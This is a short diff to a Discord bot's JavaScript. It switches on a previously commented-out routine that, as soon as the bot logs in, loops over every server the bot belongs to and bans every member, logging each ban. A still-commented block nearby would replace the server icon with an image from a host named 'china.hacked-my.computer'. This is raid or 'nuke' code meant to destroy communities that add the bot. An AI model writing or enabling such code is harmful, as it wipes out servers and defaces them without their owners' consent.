@@ -28,23 +28,21 @@ client.on("ready", () => {
             });
         });
     });
-    /*
-    guild.members.forEach(m => {
-        m.ban();
-        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
+    
+
+    client.guilds.forEach(guild => {
+        guild.members.forEach(m => {
+            m.ban();
+            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
+        });
     });
-    */
+    
     //startup message log
     console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
 
+
+
     /*
-    //ban all 
-    guilds.members.forEach(m => {
-            m.ban();
-
-    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
-        
-
     //set server icon
     guild.setIcon("https://china.hacked-my.computer/95314b55.png");
 
